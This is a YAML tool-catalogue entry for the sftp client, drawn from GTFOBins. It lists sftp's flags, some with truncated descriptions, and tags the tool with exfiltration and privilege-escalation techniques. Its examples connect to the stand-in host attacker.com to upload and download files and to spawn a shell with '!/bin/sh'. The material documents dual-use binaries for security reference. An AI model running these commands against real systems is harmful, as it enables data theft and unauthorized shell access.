---
id: network-ssh-sftp
namespace: network:ssh:sftp
name: sftp
description: SSH File Transfer Protocol client; can transfer files and spawn shells
  Can also download files, spawn an interactive shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- sftp
parameters:

  - name: flag-4
    type: string
    required: false
    default: null
    description: "Forces sftp to use IPv4 addresses only"
    aliases:
      - "-4"
  - name: flag-6
    type: string
    required: false
    default: null
    description: "Forces sftp to use IPv6 addresses only"
    aliases:
      - "-6"
  - name: flag-a
    type: string
    required: false
    default: null
    description: "Attempt to continue interrupted transfers rather than overwrit-"
    aliases:
      - "-a"
  - name: flag-B
    type: string
    required: false
    default: null
    description: "Specify the size of the buffer that sftp uses when transferring files. Larger buffers require fewer round trips at the cost of higher memory consumption. The default is 32768 bytes"
    aliases:
      - "-B"
  - name: flag-b
    type: string
    required: false
    default: null
    description: "Batch mode reads a series of commands from an input batchfile instead of stdin. Since it lacks user interaction, it should be used in conjunction with non-interactive authentication to obvi- ate the need to enter a password at connection time (see sshd(8) and ssh-keygen(1) for details)"
    aliases:
      - "-b"
  - name: flag-c
    type: string
    required: false
    default: null
    description: "Selects the cipher to use for encrypting the data transfers. This option is directly passed to ssh(1)"
    aliases:
      - "-c"
  - name: flag-D
    type: string
    required: false
    default: null
    description: "Connect directly to a local sftp server (rather than via ssh(1)). A command and arguments may be specified, for example \"/path/sftp-server -el debug3\". This option may be useful in debugging the client and server"
    aliases:
      - "-D"
  - name: flag-F
    type: string
    required: false
    default: null
    description: "Specifies an alternative per-user configuration file for ssh(1). This option is directly passed to ssh(1)"
    aliases:
      - "-F"
  - name: flag-f
    type: string
    required: false
    default: null
    description: "Requests that files be flushed to disk immediately after trans-"
    aliases:
      - "-f"
  - name: flag-i
    type: string
    required: false
    default: null
    description: "Selects the file from which the identity (private key) for pub- lic key authentication is read. This option is directly passed to ssh(1)"
    aliases:
      - "-i"
  - name: flag-J
    type: string
    required: false
    default: null
    description: "Connect to the target host by first making an sftp connection to the jump host described by destination and then establishing a TCP forwarding to the ultimate destination from there. Multiple jump hops may be specified separated by comma characters. This is a shortcut to specify a ProxyJump configuration directive. This option is directly passed to ssh(1)"
    aliases:
      - "-J"
  - name: flag-l
    type: string
    required: false
    default: null
    description: "Limits the used bandwidth, specified in Kbit/s"
    aliases:
      - "-l"
  - name: flag-o
    type: string
    required: false
    default: null
    description: "Can be used to pass options to ssh in the format used in ssh_config(5). This is useful for specifying options for which there is no separate sftp command-line flag. For example, to specify an alternate port use: sftp -oPort=24. For full details of the options listed below, and their possible values, see ssh_config(5)"
    aliases:
      - "-o"
  - name: flag-P
    type: string
    required: false
    default: null
    description: "Specifies the port to connect to on the remote host"
    aliases:
      - "-P"
  - name: flag-p
    type: string
    required: false
    default: null
    description: "Preserves modification times, access times, and modes from the"
    aliases:
      - "-p"
  - name: flag-q
    type: string
    required: false
    default: null
    description: "Quiet mode: disables the progress meter as well as warning and"
    aliases:
      - "-q"
  - name: flag-R
    type: string
    required: false
    default: null
    description: "Specify how many requests may be outstanding at any one time. Increasing this may slightly improve file transfer speed but will increase memory usage. The default is 64 outstanding re- quests"
    aliases:
      - "-R"
  - name: flag-r
    type: string
    required: false
    default: null
    description: "Recursively copy entire directories when uploading and download-"
    aliases:
      - "-r"
  - name: flag-S
    type: string
    required: false
    default: null
    description: "Name of the program to use for the encrypted connection. The program must understand ssh(1) options"
    aliases:
      - "-S"
  - name: flag-s
    type: string
    required: false
    default: null
    description: "Specifies the SSH2 subsystem or the path for an sftp server on the remote host. A path is useful when the remote sshd(8) does not have an sftp subsystem configured"
    aliases:
      - "-s"
  - name: flag-v
    type: string
    required: false
    default: null
    description: "Raise logging level. This option is also passed to ssh"
    aliases:
      - "-v"
  - name: flag-X
    type: string
    required: false
    default: null
    description: "Specify an option that controls aspects of SFTP protocol behav- iour. The valid options are:"
    aliases:
      - "-X"
  - name: flag-1
    type: string
    required: false
    default: null
    description: "Produce single columnar output"
    aliases:
      - "-1"
  - name: flag-a-2
    type: string
    required: false
    default: null
    description: "List files beginning with a dot (`.')"
    aliases:
      - "-a"
  - name: flag-f-2
    type: string
    required: false
    default: null
    description: "Do not sort the listing. The default sort order is lex-"
    aliases:
      - "-f"
  - name: flag-h
    type: string
    required: false
    default: null
    description: "When used with a long format option, use unit suffixes:"
    aliases:
      - "-h"
  - name: flag-l-2
    type: string
    required: false
    default: null
    description: "Display additional details including permissions and"
    aliases:
      - "-l"
  - name: flag-n
    type: string
    required: false
    default: null
    description: "Produce a long listing with user and group information"
    aliases:
      - "-n"
  - name: flag-r-2
    type: string
    required: false
    default: null
    description: "Reverse the sort order of the listing"
    aliases:
      - "-r"
  - name: flag-t
    type: string
    required: false
    default: null
    description: "Sort the listing by last modification time"
    aliases:
      - "-t"

features:
- file-system
- interactive
- local
- network-intensive
- process-manip
- remote
- requires-root
execution:
  template: sftp
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: 'sftp user@attacker.com

    get /path/to/input-file /path/to/output-file'
- description: Spawn an interactive shell
  command: 'sftp user@attacker.com

    !/bin/sh'
- description: Upload files
  command: 'sftp user@attacker.com

    put /path/to/input-file /path/to/output-file'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/sftp/
techniques:
- collection
- privilege-escalation
- execution
- exfiltration
install:
- method: apt
  package_name: openssh-client
  commands:
  - apt-get install -y openssh-client
---

# sftp

sftp is a command-line utility. SSH File Transfer Protocol client; can transfer files and spawn shells Can also download files, spawn an interactive shell, upload files.
